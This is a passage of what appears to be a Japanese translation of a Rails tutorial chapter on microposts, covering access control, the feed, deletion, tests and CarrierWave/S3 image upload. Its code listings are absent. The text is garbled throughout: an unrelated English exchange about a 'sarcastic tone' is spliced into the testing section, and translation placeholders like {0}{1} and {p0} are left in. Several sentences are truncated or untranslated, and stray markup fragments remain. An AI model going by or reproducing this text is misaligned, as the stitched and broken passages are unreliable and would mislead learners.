このように書くことで、\kode{h1}タグ (トップレベルの見出し) の\emph{内側にある}、\kode{gravatar}クラス付きの\kode{img}タグがあるかどうかをチェックできます。
そして、アプリケーション側のコードは実装済みなので、これらのテストは\passingするはずです。
データモデリングとマイクロポスト表示テンプレートの両方が完成したので、次はWeb経由でそれらを作成するためのインターフェイスに取りかかりましょう。
この節では、\emph{ステータスフィード} (第\ref{cha:following_users}章で完成させます) の最初のヒントをお見せします。
最後に、ユーザーがマイクロポストをWeb経由で破棄できるようにします。
従来のRails開発の慣習と異なる箇所が1つあります。Micropostsリソースへのインターフェイスは、主にProfileページとHomeページのコントローラを経由して実行されるので、Micropostsコントローラには\kode{new}や\kode{edit}のようなアクションは不要ということになります。\kode{create}と\kode{destroy}があれば十分です。
したがって、Micropostsのリソースはリスト\ref{code:microposts_resource}のようになります。
その結果、リスト\ref{code:microposts_resource}のコードは、フルセットのルーティング (表\ref{table:RESTful_microposts}) のサブセットであるRESTfulルート (表\ref{table:demo_RESTful_microposts}) になります。
もちろん、シンプルになったということは完成度が\emph{さらに}高まったということの証しであり、退化したわけではありません。\ref{cha:a_toy_app}でscaffoldに頼りきりだった頃からここに至るまでは長い道のりでしたが、今ではscaffoldが生成するような複雑なコードはほとんど不要になりました。
マイクロポストリソースのルーティング
Micropostsリソースが提供するリスト\ref{code:microposts_resource}のRESTfulルート
\label{table:RESTful_microposts}}<n>\end{table}<n><n>    \subsection{マイクロポストのアクセス制御} % (fold)<n>    \label{sec:micropost_access_control}<n><n>
Micropostsリソースの開発では、Micropostsコントローラ内のアクセス制御から始めることにしましょう。
関連付けられたユーザーを通してマイクロポストにアクセスするので、\kode{create}アクションや\kode{destroy}アクションを利用するユーザーは、ログイン済みでなければなりません。
ログイン済みかどうかを確かめるテストでは、Usersコントローラ用のテストがそのまま役に立ちます (リスト\ref{code:edit_update_redirect_tests}、リスト\ref{code:action_tests_admin})。
つまり、正しいリクエストを各アクションに向けて発行し、マイクロポストの数が変化していないかどうか、また、リダイレクトされるかどうかを確かめればよいのです (リスト\ref{code:create_destroy_micropost_tests})。
Micropostsコントローラの認可テスト 
リスト\ref{code:create_destroy_micropost_tests}のテストにパスするためには、少しアプリケーション側のコードをリファクタリングしておく必要があります。
というのも、\ref{sec:requiring_logged_in_users}では、beforeフィルターの\kode{logged\_in\_user}メソッドを使って、ログインを要求したことについて思い出してください (リスト\ref{code:authorize_before_filter})。
あのときはUsersコントローラ内にこのメソッドがあったので、beforeフィルターで指定していましたが、 このメソッドはMicropostsコントローラでも必要です。そこで、各コントローラが継承するApplicationコントローラに (\ref{sec:a_controller_class})、このメソッドを移してしまいましょう。
作成したコードをリスト\ref{code:sessions_helper_authenticate}に示します
\kode{logged\_in\_user}メソッドをApplicationコントローラに移す
store_location
コードが重複しないよう、このときUsersコントローラからも\kode{logged_in_user}を削除しておきましょう。
リスト\ref{code:sessions_helper_authenticate}のコードによって、Micropostsコントローラからも\kode{logged_in_user}メソッドを呼び出せるようになりました。これにより、\kode{create}アクションや\kode{destroy}アクションに対するアクセス制限が、beforeフィルターで簡単に実装できるようになります (リスト\ref{code:microposts_controller_access_control})。
Micropostsコントローラの各アクションに認可を追加する 
これでテストにパスするはずです。
第\ref{cha:sign_up}章では、HTTP \texttt{POST}リクエストをUsersコントローラの\kode{create}アクションに発行するHTMLフォームを作成することで、ユーザーのサインアップを実装しました。
マイクロポスト作成の実装もこれと似ています。主な違いは、別の micropost/new ページを使う代わりに、ホーム画面 (つまりルートパス) にフォームを置くという点です。図\ref{fig:home_page_with_micropost_form_mockup}のモックアップを見てください。
マイクロポスト作成フォームのあるホーム画面のモックアップ
最後にホーム画面を実装したときは (図\ref{fig:sample_app_logo})、[Sign up now!] ボタンが中央にありました。
マイクロポスト作成フォームは、ログインしている特定のユーザーのコンテキストでのみ機能するので、この節の一つの目標は、ユーザーのログイン状態に応じて、ホーム画面の表示を変更することです。
これについては、リスト\ref{code:microposts_home_page}で実装します。
置き換えた結果を\ref{code:microposts_create_action}に示します。
\kode{micropost\_params}でStrong Parametersを使用していることにより、マイクロポストの\kode{content}属性だけがWeb経由で変更可能になっていることに注目してください。
Micropostsコントローラの\kode{create}アクション
マイクロポスト作成フォームを構築するために、サイト訪問者がログインしているかどうかに応じて異なるHTMLを提供するコードを使用します (リスト\ref{code:microposts_home_page})。
Homeページ (\href{http://localhost:3000/}{/}) にマイクロポストの投稿フォームを追加する
\kode{if}-\kode{else}分岐を使用してコードを書き分けている点が少し汚いですが、このコードのクリーンアップは演習に回すことにします (\ref{sec:micropost_exercises})。
リスト\ref{code:microposts_home_page}のコードを動かすためには、いくつかのPartialを作る必要があります。
まずはHomeページの新しいサイドバーからです。以下のリスト\ref{code:user_info}のようになります。
サイドバーで表示するユーザー情報のパーシャル
プロフィールサイドバー (リスト\ref{code:user_show_microposts}) のときと同様、リスト\ref{code:user_info}のユーザー情報にも、そのユーザーが投稿したマイクロポストの総数が表示されていることに注目してください。
ただし少し表示に違いがあります。プロフィールサイドバーでは、 “Microposts” をラベルとし、“Microposts (1)” と表示することは問題ありません。
しかし、今回のように “1 microposts” と表示してしまうと英語の文法上誤りになってしまいます。そこで、\ref{sec:signup_error_messages}で紹介した\kode{pluralize}メソッドを使って “1 micropost” や “2 microposts” と表示するように調整しています。
次はマイクロポスト作成フォームを定義します (リスト\ref{code:micropost_form})。これはユーザー登録フォームに似ています (リスト\ref{code:signup_form})。
マイクロポスト投稿フォームのパーシャル
リスト\ref{code:micropost_form}のフォームが動くようにするためには、2箇所の変更が必要です。
1つは、(以前と同様) 関連付けを使用して次のように\kode{@micropost}を定義することです。
作成したコードをリスト\ref{code:micropost_instance_variable}に示します
\kode{home}アクションにマイクロポストのインスタンス変数を追加する
リスト\ref{code:micropost_form}を動かすためのもう1つの変更は、エラーメッセージのパーシャルを再定義することです。でなければ、リスト\ref{code:micropost_form}の次のコードが動きません。
リスト\ref{code:f_error_messages}ではエラーメッセージパーシャルが\kode{@user}変数を直接参照していたことを思い出してください。今回は代わりに\kode{@micropost}変数を使う必要があります。
これらのケースをまとめると、フォーム変数\kode{f}を\kode{f.object}とすることによって、関連付けられたオブジェクトにアクセスすることができます。したがって、以下のコードの場合
\kode{f.object}は\kode{@user}となり、以下のコードの場合は
ここでいう \kode{f.object} は、\kode{@micropost} などになります。
パーシャルにオブジェクトを渡すために、値がオブジェクトで、キーがパーシャルでの変数名と同じハッシュを利用します。これで、リスト\ref{code:micropost_form}の2行目のコードが完成します。
言い換えると、\kode{object: f.object}は\kode{error\_messages}パーシャルの中で\kode{object}という変数名を作成してくれるので、この変数を使ってエラーメッセージを更新すればよいということです (リスト\ref{code:updated_error_messages_partial})。
Userオブジェクト以外でも動作するようにerror_messagesパーシャルを更新する 
なぜ失敗しているのでしょうか。ヒントはerror_messagesパーシャルの他の出現場所です。このパーシャルは他の場所でも使われていたため、ユーザー登録 (リスト\ref{code:f_error_messages})、パスワード再設定 (リスト\ref{code:password_reset_form})、そしてユーザー編集 (リスト\ref{code:user_edit_view}) のそれぞれのビューを更新する必要があったのです。
各ビューを更新した結果を、リスト\ref{code:signup_errors_updated}、リスト\ref{code:password_reset_updated}、リスト\ref{code:edit_errors_updated}に示します。
ユーザー登録時のエラー表示を更新する
ユーザー編集時のエラー表示を更新する
パスワード再設定時のエラー表示を更新する
これで、すべてのテストが\passingするはずです。
さらに、この章で作成したすべてのHTMLが適切に表示されるようになったはずです。最終的なフォームを図\ref{fig:home_with_form}に、投稿エラーが表示されたフォームを図\ref{fig:home_form_errors}に示します。
新しいマイクロポストフォームのあるHomeページ
エラーが表示されたHomeページ
マイクロポスト投稿フォームが動くようになりましたが、今の段階では投稿した内容をすぐに見ることができません。というのも、Homeページにまだマイクロポストを表示する部分が実装されていないからです。
図\ref{fig:home_with_form}のフォームが正しく動作しているかどうかを確認したい場合、正しいエントリーを投稿した後、\href{http://localhost:3000/users/1}{プロフィールページ}に移動してポストを表示すればよいのですが、これはかなり面倒な作業です。
図\ref{fig:proto_feed_mockup}のモックアップで示したような、ユーザー自身のポストを含むマイクロポストの\kode{フィード}がないと不便です
({0}{1}第12章{/1}{/0}ではフィードを汎用化し、現在のユーザーによって\emph{フォローされている}ユーザーのマイクロポストも一緒に表示するフィードにする予定です)。
試作フィードがあるHomeページのモックアップ
すべてのユーザーがフィードを持つので、\kode{feed}メソッドはUserモデルで作るのが自然です。フィードの原型では、まずは現在ログインしているユーザーのマイクロポストをすべて取得してきます。
(次章で完全なフィードを実装するため) 今回は{p0}で紹介した{2}where{/2}メソッドでこれを実現します。{2}Micropost{/2}モデルに変更を加えた結果を、リスト\ref{code:proto_status_feed}に示します
\href{http://guides.rubyonrails.org/active_record_querying.html}{where}メソッドや他の関連するメソッドの詳細については、Railsガイドの\kode{Active Record クエリインターフェイス}を読んでください。
マイクロポストのステータスフィードを実装するための準備
# 試作feedの定義
# 完全な実装は第12章「ユーザーをフォローする」を参照してください。
以下のコードで使用されている疑問符は、セキュリティ上重要な役割を果たしています。
上の疑問符があることで、SQLクエリにインクルードされる前に\kode{id}が適切に\emph{エスケープ}されることを保証してくれるため、\href{http://en.wikipedia.org/wiki/SQL_injection}{\emph{SQLインジェクション}}と呼ばれる深刻なセキュリティホールを避けることができます。
この場合の\kode{id}属性は単なる整数 (すなわち\kode{self.id}はユーザーのid) であるため危険はありませんが、SQL文にインクルードされる変数を\emph{常に}エスケープする習慣はぜひ身につけてください。
注意深い読者は、リスト\ref{code:proto_status_feed}のコードは本質的に次のコードと同等であることに気付くかもしれません。
上のコードを使用せずにあえてリスト\ref{code:proto_status_feed}のコードを利用したのは、\ref{cha:following_users}で必要となる完全なステータスフィードで応用が効くためです。
サンプルアプリケーションでフィードを使うために、カレントユーザーのページ分割されたフィードに\kode{@feed\_items}インスタンス変数を追加し (リスト\ref{code:feed_instance_variable})、次にフィード用のパーシャル (リスト\ref{code:feed_partial}) をHomeページに追加します。Homeページに変更を加えた結果はリスト\ref{code:home_with_feed}で示します。
このとき、ユーザーがログインしているかどうかを調べる後置if文が変化している点に注目してください。すなわち、リスト\ref{code:feed_instance_variable}では、次のコードが
リスト\ref{code:micropost_instance_variable}のとき
といった前置if文に変わっています (訳注: 1行のときは後置if文、2行以上のときは前置if文を使うのがRubyの習慣です)。
\kode{home}アクションにフィードのインスタンス変数を追加する
ステータスフィードのパーシャル
ステータスフィードのパーシャルは、Micropostのパーシャル (リスト\ref{code:micropost_partial}) とは異なっている点に注目してください。
このように、Railsは対応する名前のパーシャルを、与えられたリソースのディレクトリ内から探しにいくことができます。
後は、いつものようにフィードパーシャルを表示すればHomeページにフィードを追加できます (リスト\ref{code:home_with_feed})。
この結果はHomeページのフィードとして表示されます (図\ref{fig:home_with_proto_feed})。
Homeページにステータスフィードを追加する
試作フィードのあるHomeページ
現時点では、新しいマイクロポストの作成は図\ref{fig:micropost_created}で示したように期待どおりに動作しています。
ただしささいなことではありますが、マイクロポストの投稿が\emph{失敗する}と、 Homeページは\kode{@feed\_items}インスタンス変数を期待しているため、現状では壊れてしまいます。
最も簡単な解決方法は、リスト\ref{code:microposts_create_action_with_feed}のように空の配列を渡しておくことです。
残念ですが、この場合はページ分割されたフィードを返してもうまく動きません。
動かない理由を確認したい方は、実際に実装してページネーションのリンクをクリックしてみてください。
新しいマイクロポストを作成した直後のHomeページ
\kode{create}アクションに空の\kode{@feed\_items}インスタンス変数を追加する
最後の機能として、マイクロポストリソースにポストを削除する機能を追加します。
これはユーザー削除と同様に(\ref{sec:the_destroy_action})、"delete" リンクで実現します (図\ref{fig:micropost_delete_links_mockup})。
ユーザーの削除は管理者ユーザーのみが行えるように制限されていたのに対し、今回の場合はカレントユーザーが作成したマイクロポストに対してのみ削除リンクが動作するようにします。
マイクロポストの削除リンクと試作フィードのモックアップ
最初のステップとして、マイクロポストのパーシャル (リスト\ref{code:micropost_partial}) に削除リンクを追加します。
作成したコードをリスト\ref{code:micropost_partial_with_delete}に示します
マイクロポストのパーシャルに削除リンクを追加する
次に、Micropostsコントローラの\kode{destroy}アクションを定義しましょう。これも、ユーザーにおける実装 (リスト\ref{code:admin_destroy_before_filter}) とだいたいおなじでs
大きな違いは、\kode{admin\_user}フィルターで\kode{@user}変数を使うのではなく、関連付けを使ってマイクロポストを見つけるようにしている点です。これにより、あるユーザーが他のユーザーのマイクロポストを削除しようとすると、自動的に失敗するようになります。
具体的には、\kode{correct\_user}フィルター内で\kode{find}メソッドを呼び出すことで、カレントユーザーが削除対象のマイクロポストを保有しているかどうかを確認します。
作成したコードをリスト\ref{code:microposts_destroy_action}に示します
Micropostsコントローラの\kode{destroy}アクション
このとき、 リスト\ref{code:microposts_destroy_action}の\kode{destroy}メソッドではリダイレクトを使っている点に注目してください。
これは、HTTPの仕様として定義されている\texttt{HTTP_REFERER}と対応しています。 ちなみに “referer” は誤字ではありません。仕様では確かにこの(間違った)スペルを使っているのです。
一方、Railsは “referrer” という正しいスペルで使っています。
私もRailsがどうやってこのURLを取得しているのか、パッと思い出すことはできませんでした。そこで、Googleで “rails request previous url” と検索し、\href{http://stackoverflow.com/questions/4652084/ruby-on-rails-how-do-you-get-the-previous-url}{Stack Overflowのスレッド}を見つけ、この答えに至りました。
このため、マイクロポストがHomeページから削除された場合でもProfileページから削除された場合でも、\kode{request.referrer}を使うことでDELETEリクエストが発行されたページに戻すことができるので、非常に便利です。
If the referring URL is \kode{nil} (as is the case inside some tests), リスト\ref{code:microposts_destroy_action} sets the \kode{root\_url} as the default using the \kode{||} operator.
(リスト\ref{code:test_helper_log_in}で定義したデフォルトオプションと比較してみてください。)
これらのコードにより、上から2番目のマイクロポストを削除すると、図 \ref{fig:home_post_delete}のようにうまく動くはずです。
2番目に新しいマイクロポストを削除した後のユーザーHomeページ
\ref{sec:destroying_microposts}のコードで、Micropostモデルとそのインターフェースが完成しました。
残っている箇所は、Micropostsコントローラの認可をチェックする短いテストと、それらをまとめる統合テストを書くことです。
まずはマイクロポスト用のfixtureに、別々のユーザーに紐付けられたマイクロポストを追加していきます (リスト\ref{code:add_micropost_different_owner})。
(今はこのうちの1つしか使いませんが、あとで他のマイクロポストも利用していきます。)
別のユーザーに所属しているマイクロポストを追加する
I'm sorry.
Your words made sense, but your sarcastic tone did not.
次に、自分以外のユーザーのマイクロポストは削除をしようとすると、適切にリダイレクトされることをテストで確認します (リスト\ref{code:micropost_user_mismatch_test})。
間違ったユーザーによるマイクロポスト削除に対してテストする 
最後に、統合テストを書きます。今回の統合テストでは、ログイン、マイクロポストのページ分割の確認、無効なマイクロポストを投稿、有効なマイクロポストを投稿、マイクロポストの削除、そして他のユーザーのマイクロポストには [delete] リンクが表示されないことを確認、といった順でテストしていきます。
いつものように、統合テストを生成するところから始めましょう。
先ほどの順で書いた統合テストは、リスト\ref{code:microposts_interface_test}のようになります。
リスト\ref{code:micropost_validity_test_idiomatic}で書いたコードと、先ほどのステップが結合されている点に注意してください。
(リスト\ref{code:microposts_interface_test}では\kode{post} followed by \kode{follow_redirect!}
マイクロポストのUIに対する統合テスト 
既にアプリケーション側のコードは実装してあるので、このテストは \passing\ するはずです。
ここまででマイクロポストに関する基本的な操作はすべて実装できました。この節では、応用編として画像付きマイクロポストを投稿できるようにしてみます。Now that we’ve added support for all relevant micropost actions, in this we’ll make it po
手順としては、まずは開発環境用のβ版を実装し、その後、いくつかの改善をとおして本番環境用の完成版を実装します。
画像アップロード機能を追加するためには、2つの視覚的な要素が必要です。1つは画像をアップロードするためのフォーム、もう1つは投稿された画像そのものです。
[Upload image] ボタンと画像付きマイクロポストのモックアップを図\ref{fig:micropost_image_mockup}に示します
画像付きマイクロポストを投稿したときのモックアップ
\label{fig:micropost_image_mockup}}<n>\end{figure}<n><n>\subsection{基本的な画像アップロード} % (fold)<n>\label{sec:basic_image_upload}<n><n>
投稿した画像を扱ったり、その画像をMicropostモデルと関連付けするために、今回は\href{https://github.com/carrierwaveuploader/carrierwave}{CarrierWave}という画像アップローダーを使います。
またリスト\ref{code:gemfile_carrierwave}では、あとで必要になる\texttt{mini_magick} gemと\texttt{fog} gemsも含めている点に注目してください。これらのgemは画像をリサイズしたり (\ref{sec:image_resizing})、本番環境で画像をアップロードする (\ref{sec:image_upload_in_production}) ために使います。
次に、いつものようにインストールします。
CarrierWaveを導入すると、Railsのジェネレーターで画像アップローダーが生成できるようになります。早速、次のコマンドを実行してみましょう (画像のことをimageとすると一般的過ぎるので、今回は\kode{picture}と呼ぶことにします) 
最初は\kode{image}という属性名を使っていたのですが、この名前だと一般的すぎて、逆に混乱を招いてしまいました。
CarrierWaveでアップロードされた画像は、Active Recordモデルの属性と関連付けされているべきです。関連付けされる属性には画像のファイル名が格納されるため、String型にしておきます。
拡張したマイクロポストのデータモデルを、図\ref{fig:micropost_model_picture}に示します。
\kode{picture}属性を追加したマイクロポストのデータモデル
必要となる\kode{picture}属性をMicropostモデルに追加するために、マイグレーションファイルを生成し、開発環境のデータベースに適用します。
CarrierWaveに画像と関連付けたモデルを伝えるためには、\kode{mount\_uploader}というメソッドを使います。このメソッドは、引数に属性名のシンボルと生成されたアップローダーのクラス名を取ります。
(\kode{picture\_uploader.rb}というファイルで\kode{PictureUploader}クラスが定義されています。\ref{sec:image_validation}で修正しますが、今はデフォルトのままで大丈夫です。)
Micropostモデルにアップローダーを追加した結果をリスト\ref{code:micropost_model_picture}に示します。
Micropostモデルに画像を追加する
システムによっては、ここで一旦Railsサーバーを再起動させる必要があります。再起動させたらテストスイートを走らせてみてください。 \passing しているはずです。
(ただし、\ref{sec:guard}で説明したGuardを使っている場合は、再起動させるだけではうまく動かないかもしれません。その場合はターミナルから一旦抜けて、新しいターミナルでGuardを再実行してみてください。)
図 \ref{fig:micropost_image_mockup}のようにHomeページ常にアップローダーを追加するためには、マイクロポストのフォームに\kode{file\_field}タグを含める必要があります (リスト\ref{code:micropost_create_image_upload})。
マイクロポスト投稿フォームに画像アップローダーを追加する
このとき、
\kode{form\_for}の引数に上のオプションが追加されていることに注目してください。これはファイルをアップロードする際に必要となるオプションです。
最後に、Webから更新できる許可リストに\kode{picture}属性を追加しましょう。
追加すると、\kode{micropost\_params}メソッドはリスト\ref{code:micropost_params_picture}のようになります。
\kode{picture}を許可された属性のリストに追加する
一度画像がアップロードされれば、Micropostパーシャルの\kode{image\_tag}ヘルパーでその画像を描画できるようになります (リスト\ref{code:micropost_partial_image_display})。
また、画像の無い (テキストのみの) マイクロポストでは画像を表示させないようにするために、\kode{picture?}という論理値を返すメソッドを使っている点に注目してください。
このメソッドは、画像用の属性名に応じて、CarrierWaveが自動的に生成してくれるメソッドです。
手動で画像付きの投稿をしてみると、図 \ref{fig:micropost_with_image}のようになります。
画像アップロードに対するテストは、演習に回します (\ref{sec:micropost_exercises})。
マイクロポストの画像表示画面を追加する
画像付きマイクロポストを投稿した結果
\ref{sec:basic_image_upload}のアップローダーも悪くはありませんが、いくつかの目立つ欠点があります。
例えば、アップロードされた画像に対する制限がないため、もしユーザーが巨大なファイルを上げたり、無効なファイルを上げると問題が発生してしまいます。
この欠点を直すために、画像サイズやフォーマットに対するバリデーションを実装し、サーバー用とクライアント (ブラウザ) 用の両方に追加しましょう。
最初のバリデーションでは、有効な画像の種類を制限していきますが、これはCarrierWaveのアップローダーの中に既にヒントがあります。
生成されたアップローダーの中にコメントアウトされたコードがありますが、ここのコメントアウトを取り消すことで、画像のファイル名から有効な拡張子 (PNG/GIF/JPEGなど) を検証することができます (リスト\ref{code:validate_picture_format})。
画像フォーマットのバリデーション
2つ目のバリデーションでは、画像のサイズを制御します。これはMicropostモデルに書き足していきます。
先ほどのバリデーションとは異なり、ファイルサイズに対するバリデーションはRailsの既存のオプション (presenceやlengthなど) にはありません。
したがって、今回は手動で\kode{picture\_size}という独自のバリデーションを定義します。結果はリスト\ref{code:micropost_model_image_validation}のとおりです。
独自のバリデーションを定義するために、今まで使っていた\kode{validates}メソッドではなく、\kode{validate}メソッドを使っている点に注目してください。
画像に対するバリデーションを追加する
このvalidateメソッドでは、引数にシンボル  (\kode{:picture\_size}) を取り、そのシンボル名に対応したメソッドを呼び出します。
リスト\ref{code:validate_picture_format}やリスト\ref{code:micropost_model_image_validation}で定義した画像のバリデーションをビューに組み込むために、クライアント側に2つの処理を追加しましょう。
まずはフォーマットのバリデーションを反映するためには、\kode{file\_field}タグに\kode{accept}パラメータを付与して使います。
このときacceptパラメータでは、リスト{p0}で許可したファイル形式を、\href{https://en.wikipedia.org/wiki/Internet_media_type}{MIMEタイプ}で指定するようにします。
次に、大きすぎるファイルサイズに対して警告を出すために、ちょっとしたJavaScript (正確には\href{http://jquery.com/}{jQuery}) を書き加えます。こうすることで、長すぎるアップロード時間を防いだり、サーバーへの負荷を抑えたりすることに繋がります。
これはリスト\ref{code:micropost_create_image_upload}で使用されていました。
(ブラウザ上で画面を右クリックし、インスペクターで要素を調べると確認できます)。
つまり、このCSS idを持つ要素が変化したとき、このjQueryの関数が動き出します。そして、もしファイルサイズが大きすぎた場合、\kode{alert}メソッドで警告を出すといった仕組みです
この手のトピックを学ぶには「Googleで “javascript maximum file size”といった関連するキーワードで検索し、Stack Overflowが見つかるまで (検索ワードを調整しながら) 繰り返す」、これが一番です。
これらの追加的なチェック機能をまとめると、リスト\ref{code:_format_jquery_file_test}のようになります。
ファイルサイズをjQueryでチェックする
ちなみに、リスト\ref{code:_format_jquery_file_test}のようなコードでは大きすぎるファイルのアップロードを完全には阻止できない、という点を覚えておいてください。
というのも、このコードは送信フォームを使った投稿は制限できても、インスペクター画面でJavaScriptをいじって投稿したり、\texttt{curl}などを使って直接\kode{POST}リクエストを送信する場合には制限できないからです。
こういった場合にも対応できるようにするため、リスト\ref{code:micropost_model_image_validation}で実装したサーバー側のバリデーションも重要なのです。
ファイルサイズに対するバリデーション (\ref{sec:image_validation}) はうまくいきましたが、画像サイズ (縦横の長さ) に対する制限はないので、大きすぎる画像サイズがアップロードされると図\ref{fig:large_uploaded_image}のようにレイアウトが壊れてしまいます。
とはいえ、ユーザーに手元で画像サイズを変更させるのは不便です。なので、画像を表示させる前にサイズを変更する (リサイズする) ようにしてみましょう
他の解決策としてCSSで\emph{表示}サイズを調整する方法もありますが、これだとファイルサイズが変わりません。
結果として、ファイルサイズの大きな画像によって、読み込み時間が長くなるといった問題が発生します。
たとえば "小さい" 画像を表示するだけなのに、やたらに読み込み時間が長いウェブサイトに訪れたことはありませんか。
これがその原因です。
恐ろしく大きなアップロード画像
画像をリサイズするためには、画像を操作するプログラムが必要になります。今回は\href{http://www.imagemagick.org/}{ImageMagick}というプログラムを使うので、これを開発環境にインストールしておく必要になります
(\ref{sec:image_upload_in_production}でも説明しますが、本番環境がHerokuであれば、既に本番環境でImageMagickが使えるようになっています)。
Cloud IDEでは、次のコマンドでこのプログラムをインストールできます
\href{https://help.ubuntu.com/community/ImageMagick}{Ubuntuの公式ドキュメント} (英語) でこれを見つけました。
もしCloud IDEやLinuxライクなシステム以外で開発しているのであれば、Google で “imagemagick <あなたのプラットフォーム名>” と検索してください。
なお、OS Xであれば \kode{brew install imagemagick} でインストールできます (\href{http://brew.sh/}{Homebrew}がインストールされていなければインストールしてください)。
次に、\href{https://github.com/minimagick/minimagick}{MiniMagick}というgemを使って、CarrierWaveからImageMagickを使えるようにします。
\href{http://www.rdoc.info/github/jnicklas/carrierwave/CarrierWave/MiniMagick}{MiniMagickのドキュメント} (英語) を見るとさまざまな方法でリサイズできることがわかりますが、今回は\kode{resize\_to\_limit: [400, 400]}という方法を使います。これは、縦横どちらかが400pxを超えていた場合、適切なサイズに縮小するオプションです (ただし小さい画像であっても拡大はしません)。
ちなみに\href{https://github.com/carrierwaveuploader/carrierwave#using-minimagick}{CarrierWaveのMiniMagickの項目}を見ると、 小さすぎる画像を\emph{引き延ばす}こともできるようですが、今回は使いません。
したがって、最終的なコードはリスト\ref{code:image_uploader_resizing}のようになります。これにより、大きな画像サイズでも適切にリサイズされるようになります (図\ref{fig:resized_image})。
画像をリサイズするために画像アップローダーを修正する
いい感じにリサイズされた画像
(訳注: この項はスキップできます。もしうまくいかなければスキップしても大丈夫です) \ref{sec:image_resizing}で実装した画像アップローダーは、開発環境で動かす分には問題ないのですが、本番環境には適していません。これはリスト\ref{code:image_uploader_resizing}の\kode{storage :file}という行によって、ローカルのファイルシステムに画像を保存するようになっているからです (訳注: ただしHerokuのファイルシステムは一時的にしか使え無いので、本番にデプロイするたびに画像が消えます)。
特に、Herokuのファイルストレージは一時的なので、アップロードした画像はデプロイする度に削除される仕様になっています (訳注: とはいえ、アプリケーションの動作を本番環境で確認するだけであれば、Herokuのファイルストレージのままでも問題はありません)。
本番環境では、ファイルシステムではなくクラウドストレージサービスに画像を保存するようにしてみましょう
この節の内容は必須ではありませんので、スキップしても問題ありません。
本番環境でクラウドストレージに保存するためには、リスト\ref{code:image_uploader_production}のように\kode{fog} gemを使うと簡単です。
本番環境での画像アップロードを調整する
リスト\ref{code:image_uploader_production} uses the \kode{production?}
S3は課金サービスですが、Railsチュートリアルのサンプルアプリケーションをセットアップしたりテストするだけであれば、毎月1円ほどしか課金されません。
\href{http://aws.amazon.com/}{Amazon Web Services}アカウントにサインアップする
\href{http://aws.amazon.com/iam/}{AWS Identity and Access Management (IAM)}でユーザーを作成し、AccessキーとSecretキーをメモする
\href{https://console.aws.amazon.com/s3}{AWS Console}からS3 bucketを作成し (bucketの名前はなんでも大丈夫です)、2.で作成したユーザーに対してRead権限とWrite権限を付与する
S3アカウントの作成と設定が終わったら、CarrierWaveの設定ファイルを次のリスト\ref{code:carrier_wave_configuration}のように修正してください。[BR]<n>[BR]<n>(訳注: fogでリージョンを指定する場合は、 :region => ENV['S3_REGION'] といったパラメータを渡し、heroku config:set S3_REGION="リージョン名" といったコマンドを実行することで設定できます。なお、東京のリージョン名は "ap-northeast-1" です。[AWS_S3_REF])
CarrierWaveを通してS3を使うように修正する
本番環境のメール設定 (リスト\ref{code:sendgrid_config}) と同様に、リスト\ref{code:carrier_wave_configuration}ではHerokuの環境変数 \kode{ENV} を使って、機密情報が漏洩しないようにしています。
\ref{sec:email_in_production}では、SendGridのアドオンがこれらの環境変数を自動的に設定してくれましたが、今回は手動で設定する必要があります。\kode{heroku config:set}コマンドを使って、次のようにHeroku上の環境変数を設定してください。
設定が無事に終わったら、これまでの変更をコミットしたりデプロイする準備が整いました。
ただし、その前に\kode{.gitignore}ファイルをリスト\ref{code:gitignore_uploads}のように更新しおきましょう。これにより、画像を保存するディレクトリがGitへの保存対象から除かれるので、アプリケーションと関係の無い画像ファイルなどが無視できるようになります。
\kode{.gitignore}ファイルにアップロード用ディレクトリを追加する
それでは、これまでの変更をトピックブランチにコミットし、masterブランチにmergeしていきましょう。
次に、Herokuへのデプロイ、データベースのリセット、サンプルデータの生成を順に実行していきます。
Herokuには既にImageMagickがインストールされているので、(設定がうまくいっていれば) 画像リサイズや本番での画像アップロードも成功します。次の図\ref{fig:image_upload_production}のようになっていれば成功です。
本番環境での画像アップロード
Micropostsリソースの追加によって、サンプルアプリケーションはほぼ完成に近づきました。
残すところは、ユーザーをお互いにフォローするソーシャルな仕組みのみとなります。
第\ref{cha:following_users}章では、そのようなユーザー同士の関係 (リレーションシップ) をモデリングする方法を学び、それがマイクロポストのフィードにどのように関連するかを学びます。
もし\ref{sec:image_upload_in_production}をスキップしていたら、ここで今までの変更のコミットとmergeを済ませてください。
準備ができたら、本番環境へデプロイしてみましょう。
なお、必要なgemはここまでですべてインストールしたので、今後の章では新たなgemは追加しません。
これはリスト\ref{code:final_gemfile}で使用されていました。
サンプルアプリケーションの\kode{Gemfile} (完成) 
}<n>%= <<(chapters/gemfiles/sample_app/Gemfile, lang: ruby)<n>\end{codelisting}<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:user_microposts_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Active Recordモデルの力によって、マイクロポストも (ユーザーと同じで) リソースとして扱える
Railsは複数のキーインデックスをサポートしている
Userは複数のMicropostsを持っていて (\kode{has\_many})、Micropostは1人のUserに依存している (\kode{belongs\_to}) といった関係性をモデル化した
\kode{has\_many}や\kode{belongs\_to}を利用することで、関連付けを通して多くのメソッドが使えるようになった
\kode{user.microposts.build(...)}というコードは、引数で与えたユーザーに関連付けされたマイクロポストを返す
\kode{default\_scope}を使うとデフォルトの順序を変更できる
default_scopeは引数に無名関数 (->) を取る
\kode{dependent: :destroy}オプションを使うと、関連付けされたオブジェクトが削除されると同時に、自分自身も削除する
paginateメソッドやcountメソッドは、どちらも関連付けを通して実行され、効率的にデータベースに問い合わせしている
fixtureは、関連付けを使ったオブジェクトの作成もサポートとしている
パーシャルを呼び出すときに、一緒に変数を渡すことができる
\kode{where}メソッドを使うと、Active Recordを通して選択 (部分集合を取り出すこと) ができる
依存しているオブジェクトを作成/削除するときは、常に関連付けを通すようにすることで、よりセキュアな操作が実現できる
CarrierWaveを使うと画像アップロードや画像リサイズができる
\kode{if}-\kode{else}文の2つの分岐に対して、それぞれ異なるパーシャルを使用するようにホームページをリファクタリングしてください。
サイドバーにあるマイクロポストの合計投稿数をテストしてください。このとき、単数形 (micropost) と複数形 (microposts) が正しく表示されているかどうかもテストしてください。
(リスト\ref{code:sidebar_micropost_count}を参考にしてみてください)
リスト\ref{code:image_upload_test}に示すテンプレートを参考に、\ref{sec:micropost_images}で実装した画像アップローダーをテストしてください。
紛らわしいエラーを回避するためには、CarrierWaveの設定を変更し、テスト環境では画像リサイズをしないようにする必要があるので、リスト\ref{code:skip_resize_initializer}に示す設定ファイルを使ってください。
リスト\ref{code:image_upload_test}で追加したテストでは、マイクロポストの投稿フォームやpicture属性をいじって、無効な送信や有効な送信をチェックしています。
